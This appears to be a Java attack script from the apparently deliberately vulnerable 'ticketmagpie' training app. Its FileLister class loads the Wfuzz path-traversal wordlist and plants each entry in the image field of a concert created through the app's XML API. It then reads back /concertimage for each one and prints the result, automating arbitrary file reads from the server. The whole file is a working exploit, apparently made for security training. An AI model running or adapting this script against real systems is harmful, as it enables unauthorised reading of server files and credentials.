package com.ticketmagpie.experimental;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;

import com.ticketmagpie.ApiClient;

public class FileLister {

  private ApiClient apiClient = new ApiClient("http://magpie:8080");

  public int createWithImage(String image) throws IOException {
    String sendXml = "" //
        + "<concert>" //
        + "  <band>Band for " + image + "</band>" //
        + "  <date>December 18th</date>" //
        + "  <description>Some description.</description>" //
        + "  <image>" + image + "</image>" //
        + "</concert>";

    System.out.println("POST " + image);
    ResponseEntity<String> response = apiClient.post("/api/concerts.xml", sendXml);
    if (!response.getStatusCode().equals(HttpStatus.CREATED)) {
      throw new IOException(response.getStatusCode().getReasonPhrase());
    }

    return idFrom(response.getBody());
  }

  private int idFrom(String xml) {
    int s = xml.indexOf("<id>") + 4;
    int e = xml.indexOf("</id>", s);
    return Integer.parseInt(xml.substring(s, e));
  }

  public String readImage(int id) throws IOException {
    // TODO download image
    ResponseEntity<String> response = apiClient.get("/concertimage?id=" + id);
    if (!response.getStatusCode().equals(HttpStatus.OK)) {
      throw new IOException(response.getStatusCode().getReasonPhrase());
    }

    return response.getBody();
  }

  public static void main(String[] args) throws IOException, URISyntaxException {
    new FileLister().list();
  }

  private void list() throws IOException, URISyntaxException {
    List<String> words = readWordList();
    for (String word : words) {
      int id = createWithImage(word);
      String image = readImage(id);
      System.out.println(image);
    }
  }

  private List<String> readWordList() throws URISyntaxException, IOException {
    // https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt
    URL resource = getClass().getClassLoader().getResource("Wfuzz_Traversal.txt");
    Path path = new File(resource.toURI()).toPath();
    return Files.readAllLines(path);
  }

}
